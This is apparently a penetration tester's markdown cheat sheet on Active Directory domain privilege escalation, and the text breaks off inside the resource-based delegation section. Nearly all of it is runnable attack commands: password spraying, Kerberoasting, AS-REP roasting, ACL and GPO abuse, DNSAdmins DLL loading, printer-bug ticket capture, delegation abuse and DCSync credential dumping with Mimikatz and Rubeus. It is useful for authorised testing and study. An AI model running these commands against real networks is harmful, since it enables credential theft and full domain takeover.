# Domain Privilege escalation
* [Password not required](#Password-not-required)
* [Password in description](#Password-in-description)
* [Reuse local admin password](#Reuse-local-admin-password)
* [Password spraying](#Password-spraying)
* [Kerberoast](#Kerberoast) 
  * [Set SPN](#Set-SPN)
* [AS-REP Roasting](#AS-REP-Roasting)
* [High Privileged Groups](#High-Privileged-Groups)
  * [Backup Operators](#Backup-Operators)
  * [Account Operators](#Account-Operators)
  * [DNS Admins](#DNS-Admins)
* [Access Control List(ACL)](#Access-Control-List)
  * [Check specific ACL permissions](#Specific-ACL-permissions)
  * [ACL-abuses](#ACL-abuses)
    * [Permissions on a User](#Permissions-on-a-user)
    * [Permissions on a Group](#Permissions-on-a-group)
    * [Permissions on a ComputerObject](#Permissions-on-a-ComputerObject)
    * [Permissions on Domain Object](#Permissions-on-Domain-Object)
    * [Permissions on a OU](#Permissions-on-OU)
    * [Writeowner of an object](#Writeowner-of-an-object---Change-the-owner)
    * [Owner of an object](#Owner-of-an-object---Add-GenericAll)
    * [NTLMRelay](#NTLMRelay)
    * [GPO Abuse](#GPO-Abuse)
    * [Build in groups](#Build-in-groups)
* [Delegation](#Delegation) 
  * [Unconstrained Delegation](#Unconstrained-delegation) 
    * [Printer Bug](#Printer-bug) 
  * [Constrained Delegation](#Constrained-delegation) 
  * [Resource Based Constrained Delegation](#Resource-Based-Constrained-Delegation)
    * [Webclient Attack](#Webclient-Attack)
    * [Computer object takeover](#Computer-object-Takeover) 
    * [Change-Lockscreen](#Change-Lockscreen)
* [Relaying attacks](#Relaying-attacks)
* [MS Exchange](#MS-Exchange) 
  * [Attacking externally](#Attacking-externally)
  * [Attacking from the inside](#Attacking-from-the-inside)
  * [MS Exchange escalating privileges](#MS-Exchange-escalating-privileges)
  * [NTLM Relay MS Exchange abuse](#NTLM-Relay-MS-Exchange-abuse)
* [Local Administrator Password Solution(LAPS)](#LAPS)
* [SQL Server](#SQL-Server)
  * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
  * [Initial foothold](#Initial-foothold)
  * [Privilege Escalation to sysadmin](#Privilege-Escalation-to-sysadmin)
   	* [SQL Server enumerate login](#SQL-Server-enumerate-login)
   	* [Impersonation attack](#Impersonation-attack)
   	* [Create Stored procedure as DB_Owner](#Create-Stored-procedure-as-DB_Owner)
  * [Command execution](#Command-execution)
  * [Database links](#Database-links)
  * [Data exfiltration](#Data-exfiltration)
  * [SQL Queries](#SQL-Queries)
* [WSUS](#Attacking-WSUS)
* [S4U2self](#S4U2self)
* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
  * [Misconfigured Certificate Templates](#Misconfigured-Certificate-Templates)
  * [Relaying to ADCS HTTP Endpoints](#Relaying-to-ADCS-HTTP-Endpoints)
  * [Forged Certificates](#Forged-Certificates)
* [Cross Domain attacks](#Cross-Domain-attacks)
  * [Kerberoast](#Kerberoast)
  * [MS Exchange](#MS-Exchange)
  * [Azure AD](#Azure-AD)
  * [SQL Server](#SQL-Server)
  * [Child to Forest Root](#Child-to-Forest-Root)
    * [Trust key](#Trust-key)
    * [Krbtgt hash](#Krbtgt-hash)
* [Cross Forest attacks](#Crossforest-attacks)
  * [Kerberoast](#Kerberoast2)
  * [Printer Bug](#Printer-bug2) 
  * [Trust key](#Trust-key2) 
  * [SQL Server](#SQL-Server)
  * [Foreign Security Principals](#Foreign-Security-Principals)
  * [ACLs](#ACLs)
  * [Pam Trust](#Pam-Trust)
  * [RDPInception](#RDPInception)

## Password not required
#### Check for users with password not required attribute
- These users are able to have an empty password
```
Get-DomainUser | Where-Object useraccountcontrol -Match PASSWD_NOTREQD | Select-Object samaccountname, useraccountcontrol
```

#### Check if user has empty password
- Or use powershell runas through RDP!
```
crackmapexec smb <DC IP> -u <USER> -p ''
```

## Password in description
#### Check for passwords in the description
```
Get-DomainUser | Where-Object -Property Description | Select-Object samaccountname, description
```

## Reuse local admin password
#### Dump sam database
- Requires local admin access
```
crackmapexec smb <HOST> -u <USER> -p <PASSWORD> -d <DOMAIN> --sam
```

#### Reuse local administrator password against all other hosts
```
crackmapexec smb hosts.txt -u administrator -H <HASH> -d .
```

## Password spraying
#### Retrieve a list of usernames
```
crackmapexec ldap <DC IP> -u <USER> -p <PASSWORD> --users
```

```
Get-DomainUser | Select-Object -expandproperty samaccountname
```

#### Retrieve the current password policy
```
crackmapexec smb -u <USER> -p <PASSWORD> --pass-pol
```

```
Get-DomainPolicyData
```

#### Spray easy guessable passwords against all these users
- Make sure to keep enough login attempts for the user!
- https://github.com/Greenwolf/Spray
```
crackmapexec smb <DC IP> -u <USER FILE> -p <PASSWORD FILE> --continue-on-success
```

```
spray.sh -smb <DC IP> <USER FILE> <PASSWORD FILE> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

## Kerberoast
- https://github.com/GhostPack/Rubeus
#### Find user accounts used as service accounts
```
Get-DomainUser -SPN
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

```
Rubeus.exe kerberoast /stats
```

```
.\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
```

#### Reguest a TGS
```
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
```

```
Invoke-Kerberoast -Outputformat hashcat
```

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

```
Request-SPNTicket "<SPN>"
```

#### Request TGS Avoid detection
- Based on encryption downgrade for Kerberos Etype (used by likes ATA - 0x17 stands for rc4-hmac).
- Look for kerberoastable accounts that only supports RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /rc4opsec
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
- Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 13100 -a 0 <HASH FILE> <WORDLIST>
```

```
.\John.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
```

### Set SPN
- If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
#### Enumerate permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```

#### Set SPN for the user
- Must be unique accross the forest. 
- Format ```<STRING>/<STRING>```
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
```

#### Then Kerberoast user

## AS-REP Roasting
#### Enumerating accounts with kerberos preauth disabled
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

```
./ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

#### Request encrypted AS-REP
```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Request encrypted AS-REP with rubeus
```
.\rubeus.exe asreproast /format:hashcat
.\rubeus.exe asreproast /format:hashcat /user:<USER>
```

#### Enumerate all users with kerberos preauth disabled and request a hash
```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
```Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......```
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Set pre-auth not required
- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.

#### Enumerate permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

## High Privileged Groups
- Default Administrators, Domain Admins and Enterprise Admins "super" groups.
- Server Operators, Members are allowed to log onto DCs locally and can modify services, access SMB shares, and backup files.
- Backup Operators, 	Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
- Print Operators,	Members are allowed to logon to DCs locally and "trick" Windows into loading a malicious driver.
- Hyper-V Administrators, If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
- Account Operators,	Members can modify non-protected accounts and groups in the domain.
- Remote Desktop Users,	Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
- Remote Management Users,	Members are allowed to logon to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).
- Group Policy Creator Owners,	Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
- Schema Admins,	Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
- DNS Admins,	Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.

### Backup Operators
- Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. 
- Backup Operators also can log on to and shut down the computer. 
- They also have the permissions needed to replace files (including operating system files) on domain controllers.

#### Get members of the backup operators group
```
Get-DomainGroupMember "Backup Operators" | Select-Object Membername
```

#### Host a public SMB share
```
python3 /opt/impacket/examples/smbserver.py share <DIRECTORY FOR SHARE> -smb2support
```

#### Retrieve SAM, SYSTEM, and SECURITY HIVE
- Run it as the "Backup Operator" user
- https://github.com/mpgn/BackupOperatorToDA
```
.\BackupOperatorToDA.exe -t \\<DC FQDN> -u <USER> -p <PASSWORD> -d <DOMAIN> -o \\<IP>\<SHARE>\
```

#### Run secretsdump.py to extract machine account hash
```
secretsdump.py LOCAL -system <DIRECTORY FOR SHARE>/SYSTEM -security <DIRECTORY FOR SHARE>/SECURITY -sam <DIRECTORY FOR SHARE>/SAM
````

#### Run DCSync with the computer account hash
```
secretsdump.py '<DOMAIN>/<DC COMPUTERACCONT NAME>$'@<DC FQDN> -hashes <LM HASH>:<NTLM HASH>
```

### Account Operators
The group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. By default it has no direct path to Domain Admin, but these groups might be able to add members to other groups which have other ACL's etc. In this lab (as far as I know) you cant become DA with these privileges.

Paths to domain admins can be created if Exchange is installed for example since the Account Operator group can manage Exchange groups which have high privileges to the domain object. If they are created high privileged groups within the domain, there is a big chance that there is a path to gain access to other machines or domain admins using this group!

### DNS Admins
#### Enumerate member of the DNS admin group
```
Get-NetGRoupMember “DNSAdmins”
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```

## Access Control List
- It is possible to abuse permissions (ACL's)
- `ObjectDN` = The object the permissions apply to
- `ActiveDirectoryRight` == Permissions
- `IdentityReferenceName` == Object who has the permissions
- Edge cases https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html

#### Scan for ACL permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
```
- Check every owned user in bloodhoud

#### Aclight2 scan
- https://github.com/cyberark/ACLight
```
Import-Module ACLight2.psm1
Start-ACLAnalysis
```

### Specific ACL permissions
#### Scan for specific ACL permissions the user has
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName | Where-Object -Property IdentityreferenceName -Match <USERNAME>

Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"} | select-object ObjectDN, ObjectAceType
```

#### Scan for all ACL permissions of the user has on another specific object
- First get the SID of the user you want to check if he has permissions on target user
```
Get-Domainuser <USERNAME> | Select-Object samaccountname, objectsid
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

### ACL abuses
- In case you have a GenericAll permission on a user, you can:
  - Set a SPN on behalf of that user and crack it (stealthy method)
  - Change his password and log in as that user (not stealthy but immediate access is given)
- Force-ChangePassword privilege can also allow you to change the password of a user

- In case you have a GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission, you can
  - Add yourself to this group, and as a result obtain the privileges that this group possesses.

- In case you have WriteOwner permissions you can add a owner to the object.

### Permissions on a user

#### Generic all / Force Change Password / AllExtendedRights - Reset password of a user
```
net user <USERNAME> <PASSWORD> /domain

$UserPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $UserPassword
```

#### Generic write - Set SPN for user
- For example service ```HTTP/jumpbox```
- Then kerberoast the user [Kerberoast](#Kerberoast) 
- Execute command again to revert it
```
Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SPN>1'}
```

#### Generic write - Add preauthnotreq flag
- Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
- Execute command again to revert it
```
Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Write owner - Change owner and give generic all
- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
```
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose

# Check who is owner 
Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
Get-DomainObject -Identity <SID>

# Check new rights - First get the SID of the user you want to check if he has permissions on target user
Get-Domainuser <USERNAME>
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

### Permissions on a group
- GenericAll permission on a Group, Write permission, Write-Owner permission GenericWrite or Self permission

#### Add user to a group 
```
Add-DomainGroupMember -Identity "<GROUP>" -Members <USER> -Verbose
net group "Domain Admins" analyst1 /domain /add
```

### Permissions on a ComputerObject
#### Write owner - Change owner and give generic all
- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
```
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose

# Check who is owner 
Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
Get-DomainObject -Identity <SID>

# Check new rights - First get the SID of the user you want to check if he has permissions on target user
Get-Domainuser <USERNAME>
Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
```

#### GenericWrite - Computer object takeover
See [Computer object takeover](#Computer-object-Takeover) 

#### Writedacl - Read LAPS password
```
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
```

### Permissions on Domain Object
#### Writedacl - Add permissions for dcsync
- Use ```Remove-ObjectAcl``` to remove the ACL's
```
Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync -Verbose

#After impersonating the user with these permissions the above didn't work, but this did:
Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
```

#### GenericAll - Dcsync
- Execute DC Sync

### Permissions on OU
#### Generic all - Inherit down
- The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. 

#### Fetch guids for all objects
```
$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
```

#### Grant user full control of all descendant objects:
```
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity '<USER>' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
```

#### Apply this ACE to our target OU:
```
$OU = Get-DomainOU -Raw <OU NAME>
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

#### If laps is enabled, read password
```
Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
```

### Writeowner of an object - Change the owner
- When writeowner
```
Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerIdentity <NEW OWNER>

Get-DomainObjectAcl -Identity <IDENTITY> -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
```

### Owner of an object - Add GenericAll
```
Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -Rights all -PrincipalIdentity <USER WHO GETS GENERIC ALL> -Verbose

Get-DomainObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
```

#### NTLMRelay
- It is possible to abuse ACL with NTLMRelay abuse
```
ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
```

#### Restore ACL's with aclpwn.py
- NTLMRelayx performs acl attacks a restore file is sived that can be used to restore the ACL's
```
python3 aclpwn.py --restore aclpwn.restore
```

### GPO Abuse
- Members of ```Group Policy Creator Owners``` can create new GPO's. But they cant link it to anything or modify existing GPO’s. The creator will have to modify rights over created GPO.

#### Show who can create new GPO's
```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<DOMAIN>,DC=<DOMAIN>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

#### Show who can write to GP-link attribute on OUs
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

#### Show who can edit GPO's with 4 digit RID
- Has WriteProperty, WriteDACL or WriteOwner
```
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

#### Resolve sid + Object dn
```
ConvertFrom-SID <SID>
Get-DomainGPO -Name "{<OBJECT DN SID>}" -Properties DisplayName
```

#### Create GPO and link to OU
- Uses RSAT tools or https://github.com/Dliv3/SharpGPO
```
New-GPO -Name "SMB security" | New-GPLink -Target "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>"

SharpGpo.exe --Action NewGPO --GPOName SMB security
SharpGpo.exe --Action NewGPLink --DN "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" --GPOName SMB security
```

#### Set autorun value
- Uses RSAT tools
- Best is to set the executable on a share in the domain
```
Set-GPPrefRegistryValue -Name "Testing GPO SMB security" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\<HOSTNAME>\<SHARE>\pivot.exe" -Type ExpandString
```

#### Add local admin abuse
- https://github.com/FSecureLABS/SharpGPOAbuse
```
./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
gpupdate /force #On the target machine if you got normal access already
net localgroup administrators
```

#### Create scheduled task
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
```

### Build in groups
- https://cube0x0.github.io/Pocing-Beyond-DA/

## Delegation
- In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
- In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.

### Unconstrained Delegation
- To execute attack owning the server with unconstrained delegation is required!

#### Discover domain computers which have unconstrained delegation
- Domain Controllers always show up, ignore them
- Use the ```-domain``` flag to check for other domain
```
Get-DomainComputer -UnConstrained
Get-DomainComputer -UnConstrained | select samaccountname
```

```
.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

#### Check if any DA tokens are available on the unconstrained machine
- Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

```
.\Rubeus.exe triage
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

```
.\Rubeus.exe dump /luid:<LUID> /service:<SERVICE>
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

```
.\Rubeus.exe ptt /ticket:<TICKET FILE>
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Printer bug
- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
- A way to force a TGT of DC on the target machine
- https://github.com/leechristensen/SpoolSample
#### Check if spool server is running
```
#Edit IP at the bottom
spoolerscan.ps1
```

```
ls \\<DC>\pipe\spoolss
```

#### Listen with rubeus for incoming tickets
- Requires running as system!
- https://powershell-guru.com/powershell-tip-53-run-powershell-as-system/
```
.\rubeus.exe monitor /interval:5
```

#### Force authentication of the DC
```
.\SpoolSample.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>
```

#### Copy, save and trim the ticket
```
cat dc_ticket.txt | tr -d "\n" | tr -d " "
```

#### Import the ticket
- Paste the ticket from previous command
```
.\Rubeus.exe ptt /ticket:<TICKET>
```

#### Then DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```

### Constrained Delegation
- To execute attack owning the user or server with constrained delegation is required.
#### Enumerate users with contrained delegation enabled
- Use the ```-domain``` flag to check for other domains
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
- Use the ```-domain``` flag to check for other domains
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

```
.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

### Constrained delegation User
#### Rubeus calculate password hash
- If only password is available calculate the hash
```
.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
```


#### Check for user to impersonate
```
Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Rubeus request and inject TGT + TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right. 
- Make sure they are local admin on the target machine.
```
.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:<USER> /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
```

#### Requesting TGT with kekeo
```
./kekeo.exe
Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
```

#### Requesting TGS with kekeo
```
Tgs::s4u /tgt:<TGT> /user:<USER>@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
```

#### Use Mimikatz to inject the TGS ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Constrained delegation Computer
#### Rubeus request and inject TGT + TGS
```
.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /aes256:<AES HASH> /opsec /altservice:<SECOND SERVICE> /ptt 
```

#### Rubeus Dump TGT + ask TGS for CIFS
```
.\Rubeus.exe triage
.\Rubeus.exe dump \luid:<LUID> \service:<SERVICE>
.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /ticket:<BASE64 TGT> /nowrap
```

#### Requesting TGT with a PC hash
```
./kekeo.exe
Tgt::ask /user:<COMPUTERNAME>$ /domain:<DOMAIN> /rc4:<HASH>
```

#### Requesting TGS
No validation for the SPN specified
```
Tgs::s4u /tgt:<kirbi file> /user:<USER> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
```

#### Using mimikatz to inject TGS ticket and executing DCsync
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

### Resource Based Constrained Delegation
### Computer object takeover
- Requirements:
  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
  - A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

#### Check if domain controller is atleast Windows Server 2012
```
Get-DomainController
```

#### Check if target doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
```
Get-DomainComputer <COMPUTERNAME> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

#### Get access to a user or computer with SPN set
- If not already owned a user or computer with a SPN, Create a computer object!

#### Check who can add computers to the domain
```
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota | select-object ms-ds-machineaccountquota
```

#### Create a new computer object
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
```
Import-Module Powermad.ps1 
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
```

#### Get the object SID
- If already had a user with SPN use that user, otherwise use the computer you made!
```
Get-DomainComputer FAKE01
Get-DomainUser <USER>
```

#### Creata a new raw security descriptor
- Use the SID from previous command
``` 
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

#### Modify the target computer object
```
Get-DomainComputer <TARGET COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

#### Check if modification worked
```
Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

#### Check if raw security descriptor is refering to the correct machine
```
$RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
Get-DomainComputer <SID>
```

#### Calculate RC4 hash for the user/computer object
- Only if you made a computer or you dont know the hash of the user
```
.\Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
```

#### Select user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound).
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Impersonate another user (For example DA)
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt

